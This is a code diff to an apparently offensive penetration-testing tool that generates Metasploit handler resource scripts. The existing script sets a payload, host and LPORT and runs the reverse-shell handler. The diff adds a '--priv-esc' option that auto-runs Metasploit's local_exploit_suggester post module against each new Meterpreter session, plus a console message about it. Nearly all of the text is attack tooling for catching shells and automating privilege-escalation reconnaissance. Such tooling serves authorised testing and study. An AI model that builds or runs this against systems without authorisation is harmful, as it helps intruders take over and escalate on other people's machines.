@@ -6239,9 +6239,20 @@ def generate_msf_payload(payload, output, host_key, host_value, extra_msfvenom_a
       "set payload " + payload + settings.END_LINE.LF +
       "set " + host_key.lower() + " " + str(host_value) + settings.END_LINE.LF +
       "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+      priv_esc_autorun_line(payload) +
       "exploit" + settings.END_LINE.LF * 2
     )
   return data
+
+"""
+'--priv-esc': the handler line that runs Metasploit's own local-exploit-suggester post module
+against a Meterpreter session the instant it opens - nothing to add for a plain (non-Meterpreter)
+shell, which Metasploit tracks as a session but has no post-module compatibility with.
+"""
+def priv_esc_autorun_line(payload):
+  if menu.options.priv_esc and "meterpreter" in payload:
+    return "set AutoRunScript post/multi/recon/local_exploit_suggester" + settings.END_LINE.LF
+  return ""
 
 """
 Message regarding the MSF handler.
@@ -6249,6 +6260,9 @@ Message regarding the MSF handler.
 def msf_launch_msg(output):
     info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    if menu.options.priv_esc:
+      info_msg = "Once a session opens, 'post/multi/recon/local_exploit_suggester' runs against it automatically ('--priv-esc')."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
     info_msg = "Once the loading finishes, press any key here to continue..."
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
     sys.stdin.readline().replace(settings.END_LINE.LF, "")
